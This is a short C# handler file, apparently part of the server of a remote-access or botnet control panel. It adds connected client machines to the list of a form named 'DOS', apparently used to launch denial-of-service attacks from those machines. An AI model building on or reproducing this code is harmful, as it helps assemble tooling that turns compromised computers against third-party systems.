using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.MessagePack;

namespace Server.Handle_Packet
{
    internal class HandleDos
    {
        public void Add(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                var DOS = (FormDOS)Application.OpenForms["DOS"];
                if (DOS != null)
                    lock (DOS.sync)
                    {
                        DOS.PlguinClients.Add(client);
                    }
            }
            catch
            {
            }
        }
    }
}